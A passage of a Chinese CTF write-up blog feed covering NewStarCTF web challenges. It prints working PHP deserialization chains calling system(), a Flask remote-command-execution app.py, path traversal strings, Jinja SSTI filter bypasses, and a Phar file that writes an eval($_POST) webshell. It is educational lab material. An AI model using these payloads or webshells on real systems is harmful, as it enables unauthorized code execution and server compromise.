class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>unserialize()</code>函数在扫描到序列化字符串格式有误时会提取触发对象的<code>__destruct()</code>方法导致命令执行。</p><p><code>data=O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;1&#125;</code></p><p><img src="/img/fastdes3.png" alt="fastdes3"></p><p>后面看了其它师傅的<code>wp</code>发现还有其它解法：</p><p><code>https://blog.csdn.net/m0_73512445/article/details/133694293</code></p><p><code>https://blog.csdn.net/Myon5/article/details/134018456</code></p><p><strong>GC回收机制提前触发__destruct()</strong></p><p>在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉。在回收的过程中，它会自动触发_destruct方法。<br>可以令<code>$v = array($a,NULL)</code>然后<code>echo serialize($v)</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>然后把<code>i:1;N;</code>的<code>1</code>改成<code>0</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>至于为啥修改我也不是很清楚。。</p><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p><img src="/img/midsql1.png" alt="midsql1"></p><p>利用<code>sleep</code>先判断字符型还是数字型注入：</p><p>&#96;&#96;</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p><img src="/img/flaskdisk1.png" alt="flaskdisk1"></p><p>三个路由：<code>list</code>，<code>upload</code>，<code>console</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/list<br>app.py 1746b 2023-10-14 11:16:00<br>/upload<br>上传文件<br>/console<br>输入PIN码<br></code></pre></td></tr></table></figure><p>一开始以为要去生成<code>PIN</code>码然后进控制台。。但捣鼓半天也没找到能读我需要的数据的地方。</p><p><code>upload</code>这个路由倒是没啥限制，但我上传完东西不知道上传路径是啥。</p><p>后面看了下<code>wp</code>(参考：<code>https://blog.csdn.net/m0_73512445/article/details/133694293</code>):</p><p>因为访问<code>console</code>这个路由会提示要输入<code>PIN</code>码(说明<code>flask</code>开启了<code>debug</code>模式。<code>flask</code>开启了<code>debug</code>模式下，<code>app.py</code>源文件被修改后会立刻加载。所以只需要上传一个能<code>rce</code>的<code>app.py</code>文件把原来的覆盖，就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> os<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">try</span>:        <br>        cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)        <br>        data = os.popen(cmd).read()        <br>        <span class="hljs-keyword">return</span> data    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span>    <br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>) <span class="hljs-comment">#题目提示了运行在5000端口</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/flaskdisk2.png" alt="flaskdisk2"></p><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">//Dockerfile<br><span class="hljs-keyword">FROM</span> vulhub/flask:<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">ENV</span> FLAG=flag&#123;not_here&#125;<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /app/start.sh /start.sh &amp;&amp; <span class="hljs-built_in">chmod</span> 777 /start.sh</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;/start.sh&quot;</span> ]</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><img src="/img/injectme1.png" alt="injectme1"></p><p><code>/app</code>目录泄露，里面有原本在<code>src</code>目录中的文件。</p><p><img src="/img/injectme2.png" alt="injectme2"></p><p>注意<code>URL</code></p><p><img src="/img/injectme3.png" alt="injectme3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dwonload</span>():<br>filename = request.arg.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#从请求的参数中获取名为 &#x27;file&#x27; 的值，如果没有提供则默认为空字符串。</span><br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#../被替换成空，可以考虑..././绕过</span><br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename) <span class="hljs-comment">#将经过处理的文件名与 &#x27;static/img/&#x27; 目录拼接起来，生成最终的文件路径</span><br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<span class="hljs-comment">#检查文件是否存在，并且文件路径中不包含 &quot;start&quot; 字符串</span><br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br></code></pre></td></tr></table></figure><p>我们利用目录穿越去找<code>app,py</code>:</p><p><code>cancanneed?file=..././..././..././app/app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br>app.secret_key = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/cancanneed&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():<br>    all_filename = os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>)<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename)<br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backdoor&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&quot;user&quot;</span>))<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;user&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>        name = session.get(<span class="hljs-string">&quot;user&quot;</span>)<br>        <span class="hljs-keyword">if</span> re.findall(<br>                <span class="hljs-string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,<br>                name):<br>            abort(<span class="hljs-number">500</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<br>                <span class="hljs-string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)<br>    <span class="hljs-keyword">except</span> Exception:<br>        abort(<span class="hljs-number">500</span>)<br><br></code></pre></td></tr></table></figure><p>注意<code>/backdoor</code>则个路由，很明显这里存在<code>SSTI</code></p><p><code>from config import secret_key</code></p><p>目录穿越找<code>config.py</code>:</p><p><code>cancanneed?file=..././..././..././app/config.py</code></p><p><code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>抓包看<code>SESSION</code>:</p><p><img src="/img/injectme4.png" alt="injectme4"></p><p><code>eyJ1c2VyIjoiZ3Vlc3QifQ.ZWMqqQ.pyASrkelEUhTYiw79-4TDZ-IzwM</code></p><p>之前在<code>Kali</code>下过，直接用了：</p><p><img src="/img/injectme5.png" alt="injectme5"></p><p>注入点就是这个<code>guest</code>了，但过滤了挺多东西。可以把<code>guest</code>换成<code>&#123;%print(7*7)%&#125;</code>看看：</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><img src="/img/injectme6.png" alt="injectme6"></p><p><img src="/img/injectme7.png" alt="injectme7"></p><p>其实<code>+</code>这东西被过滤了无所谓的，<code>[&quot;__cla&quot;&quot;ss__&quot;]</code>能达到同样的效果</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><code>&#123;%%20print([]["__cl""ass__")%20%&#125;</code></p><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p><img src="/img/phar1.png" alt="phar1"></p><p>源码中提示<code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//注意这里的exec</span><br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br></code></pre></td></tr></table></figure><p><code>Phar反序列化</code>，参考：<code>https://mochu.blog.csdn.net/article/details/106909777</code></p><p>这东西个人理解主要就是<code>phar</code>压缩文件时，会序列化用户可控的<code>meta-data</code>的内容。然后和<code>phar://</code>协议配合把这个字段的内容反序列化，从而触发<code>__destruct()</code>等方法。</p><p>利用条件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>参考：https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/CoLo/</span>p/<span class="hljs-number">16786627</span>.html<br><span class="hljs-number">1</span>、phar文件能够上传至服务器 <br><span class="hljs-regexp">//</span>即要求存在file_get_contents()、fopen()这种函数<br><br><span class="hljs-number">2</span>、要有可利用的魔术方法<br><span class="hljs-regexp">//</span>这个的话用一位大师傅的话说就是利用魔术方法作为<span class="hljs-string">&quot;跳板&quot;</span><br><br><span class="hljs-number">3</span>、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br><span class="hljs-regexp">//</span>一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar:<span class="hljs-regexp">//</span>`这种，如果这几个特殊字符被过滤就无法实现反序列化<br><br><span class="hljs-number">4</span>、php.ini中的phar.readonly选项，需要为Off（默认是on）。<br></code></pre></td></tr></table></figure><p>利用参考文章中的代码生成我们需要的<code>phar</code>文件：</p><p>要注意的就是<code>exec是没回显的，如果是eval我们直接可以写命令进去</code></p><p>看了官方的wp，学习了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//whatsphar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>\</code>这东西是转义用的：</p><p><img src="/img/phar4.png" alt="phar4"></p><p>对于<code>$a-&gt;cmd=&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#39;a&#39;]);\&quot;&gt;/var/www/html/1.php&quot;;</code></p><p>利用<code>echo</code>输出<code>&lt;?=@eval(\\\$_POST[&#39;a&#39;]);?&gt;</code>这个字符串，然后把它重定向到<code>/var/www/html/1.php</code>中。简单说就是把一句话木马写到对应文件里。</p><p>可以看下<code>AI</code>解释：</p><p><img src="/img/phar5.png" alt="phar5"></p><p>再补充一下关于连续三个转义符号的解释。。直接贴我和<code>x1r0z</code></p><p><img src="/img/phar9.png" alt="phar9"></p><p><img src="/img/phar10.png" alt="phar10"></p><p><img src="/img/phar11.png" alt="phar11"></p><p>如果题目给的是<code>eval</code>就没这么麻烦了。。</p><p>可以自己起个环境，访问<code>/whatphar.php</code>，在根目录刷新一下就能出现我们需要的<code>hacker.phar</code>文件了。</p><p>对于<code>phar://</code>协议来说文件名不重要，只要内容格式是phar即可触发反序列化：</p><p><img src="/img/phar3.png" alt="phar3"></p><p>。。触发了过滤，检查了文件内容并且不允许出现<code>__HALT_COMPILER();?&gt;</code>。</p><p>不过对于<code>Phar</code>文件结构来说，<code>a sub</code>中要求<code>phar</code>文件必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则无法被<code>phar扩展</code>识别为<code>phar</code>文件。</p><p>搜了下<code>phar文件过滤__HALT_COMPILER();?&gt;</code>：<code>https://cloud.tencent.com/developer/article/2278965</code></p><p>可以利用<code>gizp</code>将生成的Phar文件进行压缩：</p><p><img src="/img/phar8.png" alt="phar8"></p><p>然后将生成的<code>hello.jpg</code>直接上传，会给个上传路径：</p><p><img src="/img/phar6.png" alt="phar6"></p><p>进<code>class.php</code>，利用<code>phar</code>协议反序列化：</p><p><code>file=phar://upload/f19fac1b1e7aa6a2df2d5cb5eada2d10.jpg</code></p><p>然后访问<code>1.php</code>，<code>POST</code>给<code>a</code>传参执行命令就行了。</p><p><img src="/img/phar7.png" alt="phar7"></p><h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><p>这题不会。。跟着官方<code>wp</code>做的</p><p>下载附件后先看<code>hint</code>:</p><p><img src="/img/otenboy1.png" alt="otenboy1"></p><p>进入<code>routes</code>下(注意<code>merge</code>函数)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//info.js</span><br><span class="hljs-keyword">const</span> &#123; mergeJSON, createDate &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-title function_">mergeJSON</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>), <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>), <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//submit.js</span><br><span class="hljs-keyword">const</span> &#123; rndID, mergeJSON &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">mergeJSON</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br></code></pre></td></tr></table></figure><p>利用<code>require</code>引入了一个名为<code>mergeJSON</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//utils.js</span><br><span class="hljs-keyword">const</span> mergeJSON = <span class="hljs-keyword">function</span> (<span class="hljs-params">target, patch, deep = <span class="hljs-literal">false</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> patch !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> patch;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(patch)) <span class="hljs-keyword">return</span> patch; <span class="hljs-comment">// do not recurse into arrays</span><br>    <span class="hljs-keyword">if</span> (!target) target = &#123;&#125;<br>    <span class="hljs-keyword">if</span> (deep) &#123; target = <span class="hljs-title function_">copyJSON</span>(target), patch = <span class="hljs-title function_">copyJSON</span>(patch); &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> patch) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//这里过滤了`__proto__，可以用constructor.prototype代替`</span><br>        <span class="hljs-keyword">if</span> (target[key] !== patch[key])<br>            target[key] = <span class="hljs-title function_">mergeJSON</span>(target[key], patch[key]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(未做完)Writeup_2023_NewStarCTF_Week5</title>
    <link href="/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/"/>
    <url>/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第五周，菜鸟的wp</p><span id="more"></span><hr><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p><img src="/img/week51.png" alt="week51"></p><p>源码中存在提示：</p><p><img src="/img/week52.png" alt="week52"></p><p>刷新页面去看<code>cookie</code>：</p><p><img src="/img/week53.png" alt="week53"></p><p>访问<code>pairing.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 